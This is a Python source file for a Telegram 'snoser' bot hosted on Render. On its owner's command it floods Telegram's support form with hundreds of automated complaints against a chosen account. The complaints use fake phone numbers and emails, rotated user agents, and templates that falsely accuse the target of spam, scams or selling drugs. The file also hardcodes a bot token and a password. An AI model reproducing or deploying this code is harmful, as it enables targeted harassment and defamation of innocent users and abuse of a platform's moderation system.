import os
import sys
import time
import random
import string
import threading
import subprocess
import re
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

# ===================================================================
# ТВОИ ДАННЫЕ
# ===================================================================
ТВОЙ_ТОКЕН = "8677746039:AAEruPyB_19dCamkVr5u1H2NctcCfnRgems"
ТВОЙ_ID = 7823802800

# ===================================================================
# ФЛАСК СЕРВЕР (ДЛЯ RENDER KEEP-ALIVE)
# ===================================================================
app = Flask(__name__)

@app.route('/')
def home():
    return "☢️ CYBERTEAM SNOSER RUNNING 24/7"

@app.route('/health')
def health():
    return "OK"

@app.route('/status')
def status():
    return jsonify({
        "status": "running",
        "mode": CONFIG.get("mode", "tornado"),
        "threads": CONFIG.get("threads", 200),
        "attack_running": CONFIG.get("attack_running", False),
        "uptime": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

# ===================================================================
# УСТАНОВКА МОДУЛЕЙ
# ===================================================================
required_modules = ["requests", "fake_useragent", "termcolor", "pyfiglet"]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    print("\033[36m" + "=" * 60)
    print("\033[31m" + "  ☢️ CYBERTEAM SNOSER v17.0 - RENDER EDITION ☢️")
    print("\033[35m" + "  👑 ВЛАДЕЛЕЦ: WARD")
    print("\033[35m" + "  🤖 РАБОТАЕТ 24/7 НА RENDER!")
    print("\033[36m" + "=" * 60 + "\033[0m")
    
    for module in required_modules:
        try:
            __import__(module)
            print(f"\033[32m  ✅ {module} уже установлен.\033[0m")
        except:
            print(f"\033[33m  ⏳ Установка {module}...\033[0m")
            install(module)
            print(f"\033[32m  ✅ {module} установлен.\033[0m")
    
    print("\033[36m" + "=" * 60 + "\033[0m")
    print("\033[32m  ✅ ВСЕ ГОТОВО! ЗАПУСКАЕМ...\033[0m")

check_and_install_modules()

# ===================================================================
# ИМПОРТЫ
# ===================================================================
import requests
from fake_useragent import UserAgent
from termcolor import colored
import pyfiglet

# ===================================================================
# ЦВЕТА
# ===================================================================
RESET = "\033[0m"
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
BOLD = "\033[1m"

# ===================================================================
# КОНФИГ
# ===================================================================
CONFIG = {
    "threads": 200,
    "request_timeout": 10,
    "delay_min": 0.1,
    "delay_max": 0.3,
    "mode": "tornado",
    "owner_password": "cyberteam2024",
    "bot_token": ТВОЙ_ТОКЕН,
    "owner_id": ТВОЙ_ID,
    "attack_running": False,
    "current_target": "",
    "history": []
}

# ===================================================================
# ГЕНЕРАТОРЫ
# ===================================================================
class Generators:
    @staticmethod
    def phone():
        codes = ['+7', '+380', '+375', '+1', '+44', '+49']
        return f"{random.choice(codes)}{''.join(random.choices('0123456789', k=10))}"
    
    @staticmethod
    def email():
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'mail.ru', 'yandex.ru']
        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
        return f"{name}{random.randint(1, 999)}@{random.choice(domains)}"
    
    @staticmethod
    def user_agent():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        return random.choice(agents)

# ===================================================================
# ТЕКСТЫ ДЛЯ СНОСА
# ===================================================================
class TextTemplates:
    @staticmethod
    def get_text(target_type, target, reason, link=""):
        texts = {
            "account": {
                "spam": [
                    f"Аккаунт {target} занимается МАССОВЫМ СПАМОМ! Получаю по 30 сообщений в день! Прошу заблокировать!",
                    f"{target} - СЕРИЙНЫЙ СПАМЕР! Рассылает рекламу криптовалют! Заблокируйте немедленно!",
                    f"Пользователь {target} использует ботов для спам-рассылок! Отправил более 10000 сообщений!"
                ],
                "insult": [
                    f"Аккаунт {target} ОСКОРБЛЯЕТ пользователей каждый день! Нецензурная брань и унижения!",
                    f"{target} - АГРЕССОР! Оскорбляет всех в чатах без причины! Мы устали от него!"
                ],
                "scam": [
                    f"Аккаунт {target} - МОШЕННИК! Обманул уже 30 человек на крупные суммы!",
                    f"{target} продает фейковые товары и исчезает с деньгами! Это скам!"
                ],
                "illegal": [
                    f"Аккаунт {target} распространяет НЕЛЕГАЛЬНЫЙ контент! Нарушает закон РФ!",
                    f"{target} продает НАРКОТИКИ! Статья 228.1 УК РФ! Срочно заблокировать!"
                ],
                "fake": [
                    f"Аккаунт {target} использует ВИРТУАЛЬНЫЙ НОМЕР! Это фейковый аккаунт!",
                    f"{target} зарегистрирован на одноразовый номер. Это мошенник 100%!"
                ]
            }
        }
        
        if target_type == "account":
            return random.choice(texts["account"].get(reason, texts["account"]["spam"]))
        elif target_type == "channel":
            return f"Канал {target} нарушает правила! {link} Срочно заблокировать!"
        elif target_type == "bot":
            return f"Бот {target} - НЕЛЕГАЛЬНЫЙ! Заблокировать!"
        elif target_type == "group":
            return f"Группа {target} - НАРУШЕНИЕ! Заблокировать!"
        return f"Жалоба на {target}"

# ===================================================================
# ДВИЖОК СНОСА
# ===================================================================
class SnosEngine:
    
    @staticmethod
    def send_complaint(target, target_type, reason, link=""):
        text = TextTemplates.get_text(target_type, target, reason, link)
        text += f" {Generators.user_agent()[:15]}"
        
        phone = Generators.phone()
        email = Generators.email()
        
        url = 'https://telegram.org/support'
        data = {'text': text, 'number': phone, 'email': email}
        headers = {'User-Agent': Generators.user_agent()}
        
        try:
            response = requests.post(url, headers=headers, data=data, timeout=CONFIG["request_timeout"])
            return response.status_code == 200, response.status_code
        except Exception as e:
            return False, str(e)[:30]
    
    @staticmethod
    def snos_target(target, target_type, reason, repeats, link=""):
        mode = CONFIG["mode"]
        success = 0
        failed = 0
        lock = threading.Lock()
        total = repeats
        
        print(f"\033[35m  🎯 ЦЕЛЬ: {target}")
        print(f"\033[35m  ⚡ РЕЖИМ: {mode.upper()}")
        print(f"\033[35m  🌊 ПОТОКОВ: {CONFIG['threads']}")
        
        def worker(index):
            nonlocal success, failed
            result, error = SnosEngine.send_complaint(target, target_type, reason, link)
            with lock:
                if result:
                    success += 1
                else:
                    failed += 1
            time.sleep(random.uniform(CONFIG["delay_min"], CONFIG["delay_max"]))
        
        with ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
            executor.map(worker, range(total))
        
        print(f"\033[32m  ✅ УСПЕШНО: {success}/{total}")
        print(f"\033[31m  ❌ ОШИБОК: {failed}/{total}")
        
        is_destroyed = success > total * 0.6
        CONFIG['attack_running'] = False
        CONFIG['current_target'] = ""
        
        CONFIG['history'].append({
            'target': target,
            'type': target_type,
            'success': success,
            'total': total,
            'destroyed': is_destroyed,
            'time': datetime.now().strftime('%H:%M')
        })
        if len(CONFIG['history']) > 10:
            CONFIG['history'] = CONFIG['history'][-10:]
        
        return is_destroyed

# ===================================================================
# ТЕЛЕГРАМ БОТ
# ===================================================================
class TelegramBot:
    
    @staticmethod
    def send_message(message):
        try:
            url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
            data = {
                "chat_id": CONFIG['owner_id'],
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data, timeout=5)
        except:
            pass

# ===================================================================
# ОБРАБОТЧИК КОМАНД БОТА
# ===================================================================
def process_command(text):
    text = text.strip()
    
    if text.startswith('/snos'):
        parts = text.split()
        if len(parts) >= 3:
            target = parts[1]
            try:
                repeats = int(parts[2])
                if CONFIG['attack_running']:
                    return "⚠️ СНОС УЖЕ ИДЕТ!"
                CONFIG['attack_running'] = True
                CONFIG['current_target'] = target
                def run():
                    SnosEngine.snos_target(target, "account", "spam", repeats, "")
                threading.Thread(target=run, daemon=True).start()
                return f"🎯 СНОС ЗАПУЩЕН! ЦЕЛЬ: {target}"
            except:
                return "❌ Ошибка: укажи число"
        return "❌ /snos @username 500"
    
    elif text.startswith('/status'):
        status = "🔴 ИДЕТ" if CONFIG['attack_running'] else "🟢 ОЖИДАНИЕ"
        return f"📊 СТАТУС\n\n🌐 {status}\n🎯 {CONFIG['current_target']}\n⚡ {CONFIG['threads']} потоков"
    
    elif text.startswith('/stop'):
        if CONFIG['attack_running']:
            CONFIG['attack_running'] = False
            return "🛑 СНОС ОСТАНОВЛЕН!"
        return "ℹ️ СНОС НЕ ЗАПУЩЕН"
    
    elif text.startswith('/start'):
        return """
☢️ CYBERTEAM SNOSER

👑 ВЛАДЕЛЕЦ: WARD
🤖 РАБОТАЕТ 24/7

/snos @username 500 - СНОС
/status - СТАТУС
/stop - ОСТАНОВИТЬ
"""
    else:
        return "❌ Неизвестная команда"

# ===================================================================
# ЗАПУСК БОТА В ПОТОКЕ
# ===================================================================
def start_bot():
    last_update_id = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        last_update_id = update['update_id']
                        if 'message' in update and 'text' in update['message']:
                            chat_id = update['message']['chat']['id']
                            text = update['message']['text']
                            if chat_id == CONFIG['owner_id']:
                                reply = process_command(text)
                                send_url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
                                send_data = {
                                    "chat_id": chat_id,
                                    "text": reply,
                                    "parse_mode": "HTML"
                                }
                                requests.post(send_url, data=send_data)
        except:
            time.sleep(1)

# ===================================================================
# ЗАПУСК
# ===================================================================
if __name__ == "__main__":
    # Запускаем бота в фоне
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    # Уведомление в Telegram
    TelegramBot.send_message("☢️ CYBERTEAM SNOSER ЗАПУЩЕН НА RENDER 24/7!")
    
    # Запускаем Flask сервер для Keep-Alive
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)